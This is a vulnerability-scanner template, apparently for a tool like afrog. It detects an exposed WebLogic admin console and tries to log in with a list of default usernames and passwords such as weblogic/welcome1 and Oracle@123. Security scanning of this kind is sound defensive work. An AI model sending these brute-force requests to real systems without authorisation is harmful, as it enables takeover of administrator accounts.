id: weblogic-weak-login

info:
  name: WebLogic Weak Login
  author: shadown1ng
  description: |-
    WebLogic default login credentials were discovered.
  severity: high
  verified: true
  tags: weblogic,weak-login
  created: 2023/10/14

rules:
  r00:
    request:
      method: HEAD
      path: /console/j_security_check
    expression: |
      response.status == 302  && response.headers['set-cookie'].contains("ADMINCONSOLESESSION")
    stop_if_mismatch: true
  r0:
    stop_if_match: true
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      username:
        - weblogic
        - admin
        - system
      password:
        - weblogic
        - weblogic1
        - welcome1
        - Oracle@123
        - weblogic123
        - 12345678
        - security
        - password
    request:
      method: POST
      path: /console/j_security_check
      body: j_username={{username}}&j_password={{password}}&j_character_encoding=UTF-8
    expression: response.status == 302 && !response.headers["location"].icontains("LoginForm.jsp")
expression: r00() && r0()
